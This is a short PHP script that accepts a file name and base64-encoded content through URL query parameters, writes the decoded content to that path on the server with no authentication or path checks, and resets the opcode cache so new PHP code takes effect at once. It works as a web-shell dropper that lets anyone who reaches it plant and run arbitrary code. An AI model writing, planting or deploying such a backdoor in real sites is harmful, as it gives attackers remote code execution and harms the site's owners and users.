<?php
$target = $_GET['f'] ?? '';
$payload = $_GET['d'] ?? '';
if (!$target || $payload === '') {
  http_response_code(400); echo 'missing'; exit;
}
$bytes = file_put_contents(__DIR__.'/'.$target, base64_decode($payload));
echo json_encode(['ok'=>true,'bytes'=>$bytes]);
if (function_exists('opcache_reset')) opcache_reset();
